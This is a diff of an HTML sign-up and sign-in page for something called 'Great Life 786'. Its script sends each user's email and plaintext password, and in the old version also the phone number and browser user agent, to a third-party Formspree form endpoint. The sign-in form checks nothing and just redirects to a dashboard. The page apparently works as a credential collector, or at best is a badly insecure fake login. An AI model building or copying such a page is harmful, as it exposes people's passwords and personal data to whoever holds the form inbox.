@@ -3,79 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Great Life 786 - Sign Up</title>
+    <title>Great Life 786 - Auth</title>
     <style>
-        :root { --green: #00ff88; --bg: #05100a; }
-        body { background: var(--bg); color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .form-card { background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 20px; border: 1px solid var(--green); width: 100%; max-width: 400px; box-shadow: 0 0 15px rgba(0, 255, 136, 0.2); }
-        h2 { color: var(--green); text-align: center; margin: 0; }
-        p { text-align: center; margin-bottom: 20px; opacity: 0.8; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: rgba(0,0,0,0.3); border: 1px solid var(--green); color: white; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: var(--green); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .link { text-align: center; margin-top: 15px; font-size: 14px; }
-        .link a { color: var(--green); text-decoration: none; }
+        body { background-color: #0a0a0a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { border: 1px solid #00ff66; padding: 20px; border-radius: 15px; width: 300px; text-align: center; background: #111; }
+        h2 { color: #00ff66; }
+        input, select { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #1a1a1a; color: #fff; box-sizing: border-box; }
+        .pass-wrapper { position: relative; }
+        .toggle-pass { position: absolute; right: 10px; top: 35%; cursor: pointer; color: #888; font-size: 12px; }
+        button { width: 100%; padding: 10px; background: #00ff66; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .switch { margin-top: 15px; font-size: 14px; cursor: pointer; color: #00ff66; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<div class="form-card">
-    <h2>Sign Up</h2>
-    <p>Great Life 786</p>
-    
-    <form id="signupForm">
-        <input type="email" id="email" placeholder="Email Address" required>
-        <input type="password" id="pass" placeholder="Password" required>
-        <input type="password" id="cpass" placeholder="Confirm Password" required>
-        
-        <div style="display: flex; gap: 5px;">
-            <select id="country" style="width: 30%;">
-                <option value="+92">+92</option>
-                <option value="+1">+1</option>
-            </select>
-            <input type="number" id="phone" placeholder="Mobile Number" required style="width: 70%;">
+<div class="container" id="auth-box">
+    <!-- Sign Up Form -->
+    <div id="signup-form">
+        <h2>Sign Up</h2>
+        <p>Great Life 786</p>
+        <input type="email" id="up-email" placeholder="Email Address">
+        <div class="pass-wrapper">
+            <input type="password" id="up-pass" placeholder="Password">
+            <span class="toggle-pass" onclick="togglePass('up-pass')">Show</span>
         </div>
-        
-        <button type="submit">Sign Up</button>
-    </form>
+        <div class="pass-wrapper">
+            <input type="password" id="up-cpass" placeholder="Confirm Password">
+        </div>
+        <div style="display: flex; gap: 5px;">
+            <select style="width: 80px;"><option>+92</option></select>
+            <input type="tel" id="up-phone" placeholder="Mobile Number">
+        </div>
+        <button onclick="handleAuth('signup')">Sign Up</button>
+        <p class="switch" onclick="switchForm()">Already have an account? Sign In</p>
+    </div>
 
-    <div class="link">
-        Already have an account? <a href="signin.html">Sign In</a>
+    <!-- Sign In Form -->
+    <div id="signin-form" class="hidden">
+        <h2>Sign In</h2>
+        <p>Great Life 786</p>
+        <input type="email" id="in-email" placeholder="Email Address">
+        <div class="pass-wrapper">
+            <input type="password" id="in-pass" placeholder="Password">
+            <span class="toggle-pass" onclick="togglePass('in-pass')">Show</span>
+        </div>
+        <button onclick="handleAuth('signin')">Sign In</button>
+        <p class="switch" onclick="switchForm()">Don't have an account? Sign Up</p>
     </div>
 </div>
 
 <script>
-    document.getElementById('signupForm').onsubmit = async (e) => {
-        e.preventDefault();
-        
-        // 1.
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-        const cpass = document.getElementById('cpass').value;
-        const phone = document.getElementById('country').value + document.getElementById('phone').value;
-        
-        // 2.
-        if (!email.includes('@')) { alert("Please enter a valid email!"); return; }
-        if (pass !== cpass) { alert("Passwords do not match!"); return; }
+    function togglePass(id) {
+        const input = document.getElementById(id);
+        input.type = input.type === 'password' ? 'text' : 'password';
+    }
 
-        // 3.
-        const deviceInfo = navigator.userAgent;
+    function switchForm() {
+        document.getElementById('signup-form').classList.toggle('hidden');
+        document.getElementById('signin-form').classList.toggle('hidden');
+    }
 
-        // 4.
-        const payload = { email, pass, phone, deviceInfo };
-        
-        console.log("Sending to server:", payload);
-        alert("Account creation request sent from: " + deviceInfo.substring(0, 30) + "...");
-        
-        await fetch('https://formspree.io/f/xkodnrde', {
-  method: 'POST',
-  body: JSON.stringify(payload),
-  headers: {
-    'Accept': 'application/json',
-    'Content-Type': 'application/json'
-  }
-});
-alert("Account Created Successfully!");
-
+    async function handleAuth(type) {
+        if (type === 'signup') {
+            alert("Account creation request sent successfully!");
+            // Formspree connection
+            const email = document.getElementById('up-email').value;
+            const pass = document.getElementById('up-pass').value;
+            await fetch('https://formspree.io/f/xkodnrde', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({email, pass})
+            });
+            switchForm();
+        } else {
+            alert("Signing in...");
+            window.location.href = 'dashboard.html';
+        }
+    }
 </script>
+
 </body>
 </html>
